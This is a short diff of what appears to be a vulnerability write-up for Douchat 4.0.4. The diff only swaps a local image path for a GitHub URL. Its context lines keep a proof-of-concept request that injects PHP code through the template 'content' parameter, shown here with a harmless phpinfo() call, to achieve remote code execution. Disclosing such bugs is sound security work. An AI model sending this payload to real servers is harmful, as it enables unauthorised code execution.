@@ -32,4 +32,4 @@ POC:
 ```
 index.php?s=/Mp/MobileBase/display&templateFile=././index.php&prefix=&content=<php>phpinfo();</php>
 ```
-![](.\rce.png)
+![RCE](https://github.com/Cyc1eC/Douchat4.0.4-RCE/blob/master/rce.png)
